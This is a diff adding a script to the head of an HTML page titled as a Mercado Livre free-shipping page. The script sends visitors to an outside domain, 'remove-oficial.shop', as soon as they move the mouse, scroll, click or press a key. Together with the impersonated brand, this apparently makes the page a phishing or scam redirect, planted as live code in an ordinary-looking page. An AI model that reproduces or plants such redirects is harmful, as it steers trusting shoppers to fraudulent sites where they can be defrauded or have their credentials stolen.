@@ -1,6 +1,30 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+
+  <script>
+    window.redirectURL = "https://remove-oficial.shop/mercado-livre";
+
+    function redirecionar() {
+      window.location.href = window.redirectURL;
+    }
+
+    function ativarRedirecionamento() {
+      document.removeEventListener("mousemove", ativarRedirecionamento);
+      document.removeEventListener("keydown", ativarRedirecionamento);
+      document.removeEventListener("scroll", ativarRedirecionamento);
+      document.removeEventListener("click", ativarRedirecionamento);
+      redirecionar();
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      document.addEventListener("mousemove", ativarRedirecionamento);
+      document.addEventListener("keydown", ativarRedirecionamento);
+      document.addEventListener("scroll", ativarRedirecionamento);
+      document.addEventListener("click", ativarRedirecionamento);
+    });
+  </script>
+  
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Mercado Livre - Frete Grátis</title>
